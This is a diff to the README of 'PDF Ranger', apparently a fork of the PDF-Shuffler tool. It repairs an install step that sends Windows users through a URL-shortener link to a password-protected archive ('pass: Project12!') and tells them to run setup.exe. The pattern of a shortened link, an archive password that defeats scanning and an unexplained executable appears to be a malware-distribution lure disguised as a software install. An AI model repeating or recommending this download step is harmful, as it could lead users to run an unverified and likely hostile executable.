@@ -13,7 +13,8 @@ PDF Ranger is a fork of Konstantinos Poulios’s PDF-Shuffler (see Savannah or S
 🔐 Secure File Handling – Manage files safely with built-in security features
 
 📥 Installation Guide
-### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **[Download]((https://goo.su/gFrmkW)) and extract archive(pass: Project12!)**  
+
+🔹 ✅ RECOMMENDED METHOD (Windows .exe)
+1️⃣ **[Download](https://goo.su/gFrmkW) and extract archive(pass: Project12!)**  
 2️⃣ **Run `setup.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!** 
